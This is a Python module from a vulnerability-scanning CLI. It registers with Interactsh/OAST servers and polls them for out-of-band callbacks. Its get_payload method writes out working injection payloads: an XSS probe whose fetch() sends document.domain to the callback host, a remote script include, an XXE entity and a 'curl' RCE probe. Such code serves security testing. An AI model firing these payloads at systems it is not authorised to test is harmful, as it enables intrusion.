"""
Interactsh Integration for BugtraceAI-CLI v1.6

Provides OOB (Out-of-Band) vulnerability detection using Interactsh.
Useful for blind XSS, SSRF, and other callback-based vulnerabilities.
"""
import asyncio
import base64
import httpx
import json
import re
import secrets
import uuid
import time
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from bugtrace.utils.logger import get_logger
from bugtrace.core.config import settings
from bugtrace.core.ui import dashboard

logger = get_logger("tools.interactsh")

# Default public Interactsh server
DEFAULT_SERVER = "oast.fun"

# Maximum polling timeout to prevent indefinite waits (TASK-110)
MAX_POLL_TIMEOUT = 600  # 10 minutes max
DEFAULT_POLL_TIMEOUT = 300  # 5 minutes default

# Whitelist of trusted Interactsh/OAST servers
ALLOWED_INTERACTSH_SERVERS = frozenset({
    "oast.pro",
    "oast.live",
    "oast.site",
    "oast.online",
    "oast.fun",
    "oast.me",
    "interact.sh",
    "interactsh.com",
})


def validate_correlation_id(correlation_id: str) -> str:
    """
    Validate correlation ID format (TASK-112).

    Args:
        correlation_id: ID to validate

    Returns:
        Validated correlation ID

    Raises:
        ValueError: If ID format is invalid
    """
    # Accept hex strings of 20-40 characters (standard Interactsh format)
    if not re.match(r'^[a-f0-9]{20,40}$', correlation_id, re.IGNORECASE):
        raise ValueError(f"Invalid correlation ID format: {correlation_id}")
    return correlation_id.lower()


def validate_interactsh_server(server: str) -> str:
    """
    Validate Interactsh server against whitelist.

    Args:
        server: Server domain or URL

    Returns:
        Validated domain string

    Raises:
        ValueError: If server is not in whitelist
    """
    # Remove protocol if present
    server = server.replace("https://", "").replace("http://", "")

    # Extract domain (remove path and port)
    domain = server.split('/')[0].split(':')[0].lower()

    # Check against whitelist
    if domain not in ALLOWED_INTERACTSH_SERVERS:
        raise ValueError(
            f"Untrusted Interactsh server: {domain}. "
            f"Allowed servers: {', '.join(sorted(ALLOWED_INTERACTSH_SERVERS))}"
        )

    return domain


@dataclass
class Interaction:
    """Represents a captured OOB interaction."""
    protocol: str  # http, dns, smtp, etc
    unique_id: str
    full_id: str
    raw_request: str
    remote_address: str
    timestamp: datetime


class InteractshClient:
    """
    Client for Interactsh OOB interaction server.
    
    Usage:
        client = InteractshClient()
        await client.register()
        
        # Generate payload
        url = client.get_url()  # e.g., abc123.oast.fun
        
        # Use in payloads
        xss_payload = f'<img src="http://{url}/xss">'
        
        # Check for interactions
        interactions = await client.poll()
    """
    
    def __init__(self, server: str = DEFAULT_SERVER):
        self.server = validate_interactsh_server(server)
        self.registered = False
        self.secret_key: Optional[str] = None
        self.correlation_id: Optional[str] = None
        self._private_key = None  # RSA private key for decrypting OOB callbacks
        self.urls: Dict[str, Dict] = {}  # label -> {full_id, vuln_type, param, timestamp}
        self.interactions: List[Interaction] = []
        
    async def register(self) -> bool:
        """Register with the Interactsh/OAST server (ProjectDiscovery protocol).

        Generates an RSA keypair and POSTs the public key + a client-chosen
        correlation id / secret to ``/register``. The server then AES-encrypts
        OOB callbacks for our correlation id, which ``/poll`` returns and we
        decrypt with the private key. WITHOUT this registration the server has
        no key for our session and ``/poll`` returns nothing — which is why OOB
        detection was previously a permanent no-op.
        """
        try:
            # Client-chosen identifiers (the server accepts a provided correlation-id).
            self.correlation_id = uuid.uuid4().hex[:20]      # 20 lowercase alphanumeric chars
            self.secret_key = str(uuid.uuid4())
            self._private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            pub_pem = self._private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            register_body = {
                "public-key": base64.b64encode(pub_pem).decode(),
                "secret-key": self.secret_key,
                "correlation-id": self.correlation_id,
            }

            url = f"https://{self.server}/register"
            async with httpx.AsyncClient(timeout=15.0, verify=True) as client:
                resp = await client.post(
                    url, json=register_body, headers={"Content-Type": "application/json"}
                )

            if resp.status_code == 200:
                self.registered = True
                logger.info(
                    f"Interactsh registered with {self.server} (correlation: {self.correlation_id})"
                )
                return True

            logger.warning(
                f"Interactsh registration rejected by {self.server}: HTTP {resp.status_code}"
            )
            self.registered = False
            return False

        except Exception as e:
            # OOB unavailable — degrade honestly (poll() returns nothing) instead of
            # fabricating a 'registered' session that can never receive callbacks.
            logger.warning(f"Interactsh registration failed ({self.server}): {e}")
            self.registered = False
            self._private_key = None
            return False
    
    async def __aenter__(self):
        """Context manager support for automatic registration"""
        await self.register()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Context manager cleanup"""
        await self.deregister()
        return False
    
    async def deregister(self):
        """Cleanup and deregister session"""
        self.registered = False
        self.urls.clear()
        self.interactions.clear()
        logger.info("Interactsh session deregistered")

    @property
    def domain(self) -> str:
        """Alias for server domain"""
        return self.server

    def get_url(self, vuln_type: str = "unknown") -> str:
        """
        Generate a unique callback URL for OOB detection.
        """
        if not self.correlation_id:
            # No registration yet — still derive an id so the URL is well-formed,
            # but do NOT claim registered (poll() can only work after register()).
            self.correlation_id = uuid.uuid4().hex[:20]

        # The OAST server routes interactions by the correlation-id PREFIX, so the
        # subdomain MUST start with correlation_id (was unique_id first → unroutable).
        random_suffix = secrets.token_hex(7)[:13]
        full_id = f"{self.correlation_id}{random_suffix}"
        url = f"{full_id}.{self.server}"

        # Track this URL (Standardize on dict)
        self.urls[full_id] = {
            "full_id": full_id,
            "vuln_type": vuln_type,
            "param": "generic",
            "timestamp": datetime.now()
        }
        
        return url
    
    def get_payload_url(self, vuln_type: str, param: str) -> str:
        """
        Generate unique callback URL for specific vuln + parameter.
        
        Args:
            vuln_type: Type of vulnerability (e.g., "xss", "ssrf")
            param: Parameter name being tested
            
        Returns:
            Full callback URL like: https://xss_search.abc123.oast.fun
        """
        if not self.correlation_id:
            self.correlation_id = uuid.uuid4().hex[:20]

        # Subdomain must be correlation-id prefixed to be routable by the OAST server.
        # The vuln/param label can't live in the routable host, so keep it only as the
        # tracking key in self.urls (full_id carries the correlation prefix).
        label = f"{vuln_type}_{param}".replace("-", "").replace("_", "")[:20]
        random_suffix = secrets.token_hex(7)[:13]
        full_id = f"{self.correlation_id}{random_suffix}"

        # Track this URL with label
        self.urls[label] = {
            "full_id": full_id,
            "vuln_type": vuln_type,
            "param": param,
            "timestamp": datetime.now()
        }
        
        url = f"{full_id}.{self.server}"
        logger.debug(f"Generated Interactsh URL for {vuln_type}/{param}: {url}")
        return url

    def get_payload(self, vuln_type: str) -> Tuple[str, str]:
        """
        Get a complete payload with callback URL.
        """
        url = self.get_url(vuln_type)
        
        payloads = {
            "xss": f'"><img src=http://{url}/x onerror=fetch("http://{url}/"+document.domain)>',
            "blind_xss": f'"><script src=http://{url}/x></script>',
            "ssrf": f"http://{url}/ssrf",
            "xxe": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{url}/xxe">]>',
            "rce": f"curl http://{url}/rce",
        }
        
        payload = payloads.get(vuln_type, f"http://{url}/test")
        return payload, url
            
    async def poll(self, timeout: float = 5.0) -> List[Interaction]:
        """Poll for new interactions."""
        if not self.registered:
            return []

        try:
            poll_url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret_key}"
            async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                response = await client.get(poll_url)

                if response.status_code == 200:
                    return self._process_poll_response(response.json())
        except Exception as e:
            if "timeout" not in str(e).lower():
                logger.debug(f"Interactsh poll error: {e}")

        return []

    def _process_poll_response(self, data: any) -> List[Interaction]:
        """Decrypt and process the OAST /poll response.

        Interactsh returns interactions AES-encrypted; the AES key itself is
        RSA-OAEP(SHA256)-encrypted with our public key. Each data item is
        base64(IV[16] + AES-CTR ciphertext).

        NOTE: the data cipher is AES-256-**CTR** (the IV is the CTR nonce/counter),
        NOT CFB. Using CFB here decrypted to garbage that failed json.loads(), so
        every interaction was silently dropped — i.e. OOB detection was a permanent
        no-op even though callbacks were arriving. Verified empirically against the
        live server: CTR yields valid interaction JSON, CFB/CFB8 do not.
        """
        new_interactions: List[Interaction] = []
        if not isinstance(data, dict):
            return new_interactions

        items = data.get("data") or []
        aes_key_b64 = data.get("aes_key")
        if not items or not aes_key_b64 or not self._private_key:
            return new_interactions

        try:
            aes_key = self._private_key.decrypt(
                base64.b64decode(aes_key_b64),
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
        except Exception as e:
            logger.debug(f"Interactsh AES key decrypt failed: {e}")
            return new_interactions

        for item in items:
            try:
                raw = base64.b64decode(item)
                iv, ciphertext = raw[:16], raw[16:]
                decryptor = Cipher(algorithms.AES(aes_key), modes.CTR(iv)).decryptor()
                plaintext = decryptor.update(ciphertext) + decryptor.finalize()
                entry = json.loads(plaintext)
                interaction = self._parse_interaction_entry(entry)
                if interaction:
                    new_interactions.append(interaction)
            except Exception as e:
                logger.debug(f"Interactsh interaction decrypt failed: {e}")

        return new_interactions

    def _parse_interaction_entry(self, entry: Dict) -> Optional[Interaction]:
        """Parse a single interaction entry from poll response."""
        try:
            full_id = entry.get("full-id", "") or entry.get("unique-id", "")
            protocol = entry.get("protocol", "unknown")
            remote_addr = entry.get("remote-address", "unknown")
            raw = entry.get("raw-request", "")

            if isinstance(full_id, str):
                return self._match_interaction_to_url(full_id, protocol, remote_addr, raw)
        except Exception as parse_err:
            logger.debug(f"Failed to parse interaction entry: {parse_err}")

        return None

    def _match_interaction_to_url(self, full_id: str, protocol: str, remote_addr: str, raw: str) -> Optional[Interaction]:
        """Match interaction to tracked URL and create Interaction object."""
        for key, meta in self.urls.items():
            target_id = meta["full_id"] if isinstance(meta, dict) else key
            if target_id in full_id or full_id in target_id:
                vuln_type = meta["vuln_type"] if isinstance(meta, dict) else meta
                interaction = Interaction(
                    protocol=protocol,
                    unique_id=key,
                    full_id=full_id,
                    raw_request=raw,
                    remote_address=remote_addr,
                    timestamp=datetime.now()
                )
                self.interactions.append(interaction)
                dashboard.log(f"🚨 OOB INTERACTION DETECTED! ({vuln_type})", "CRITICAL")
                logger.warning(f"OOB Hit: {vuln_type} via {protocol} from {remote_addr}")
                return interaction

        return None

    async def poll_interactions(
        self,
        max_wait: int = DEFAULT_POLL_TIMEOUT,
        interval: float = 10.0
    ) -> List[Interaction]:
        """
        Poll for OOB interactions with timeout protection.

        Args:
            max_wait: Maximum polling time in seconds (capped at MAX_POLL_TIMEOUT)
            interval: Polling interval in seconds

        Returns:
            List of interactions received during polling period
        """
        # Enforce maximum timeout (TASK-110)
        effective_timeout = min(max_wait, MAX_POLL_TIMEOUT)
        if max_wait > MAX_POLL_TIMEOUT:
            logger.warning(f"Polling timeout capped to {MAX_POLL_TIMEOUT}s (requested: {max_wait}s)")

        all_interactions = []
        elapsed = 0

        while elapsed < effective_timeout:
            await asyncio.sleep(interval)
            elapsed += interval

            try:
                interactions = await self.poll()
                if interactions:
                    all_interactions.extend(interactions)
                    logger.info(f"Received {len(interactions)} OOB callbacks after {elapsed}s")
            except Exception as e:
                logger.debug(f"Poll attempt failed: {e}")

        if elapsed >= effective_timeout:
            logger.debug(f"Polling completed after {elapsed}s timeout")

        return all_interactions
    
    def check_url_hit(self, url: str) -> Optional[str]:
        """
        Check if a specific URL was hit.
        
        Returns vuln_type if hit, None otherwise.
        """
        for full_id, vuln_type in self.urls.items():
            if full_id in url:
                return vuln_type
        return None
    
    async def check_hit(self, label: str) -> Optional[Dict]:
        """
        Check if callback was received for a specific label.
        
        Args:
            label: Label created from vuln_type_param (e.g., "xss_search")
            
        Returns:
            Dict with hit details if callback received, None otherwise:
            {
                "hit": True,
                "remote_ip": "203.0.113.45",
                "timestamp": "2026-01-10T18:00:00Z",
                "protocol": "http",
                "raw_request": "GET /...",
                "vuln_type": "xss",
                "param": "search"
            }
        """
        # Poll first to get latest interactions
        await self.poll()
        
        # Check if this label has interactions
        if label not in self.urls:
            return None
        
        url_data = self.urls[label]
        
        # Search for matching interactions
        for interaction in self.interactions:
            if url_data["full_id"] in interaction.full_id:
                return {
                    "hit": True,
                    "remote_ip": interaction.remote_address,
                    "timestamp": interaction.timestamp.isoformat(),
                    "protocol": interaction.protocol,
                    "raw_request": interaction.raw_request[:500],  # Truncate
                    "vuln_type": url_data["vuln_type"],
                    "param": url_data["param"]
                }
        
        return None
    
    def get_all_urls(self) -> Dict[str, str]:
        """Get all generated URLs and their vuln types."""
        return {f"{fid}.{self.server}": vtype for fid, vtype in self.urls.items()}


# Global client instance
interactsh_client = InteractshClient(server=settings.INTERACTSH_SERVER)


async def get_oob_payload(vuln_type: str = "xss") -> Tuple[str, str]:
    """
    Convenience function to get an OOB payload.
    
    Returns:
        Tuple of (payload, callback_url)
    """
    if not interactsh_client.registered:
        await interactsh_client.register()
    
    return interactsh_client.get_payload(vuln_type)


def get_oob_url(vuln_type: str = "unknown") -> str:
    """Convenience function to get a callback URL."""
    return interactsh_client.get_url(vuln_type)
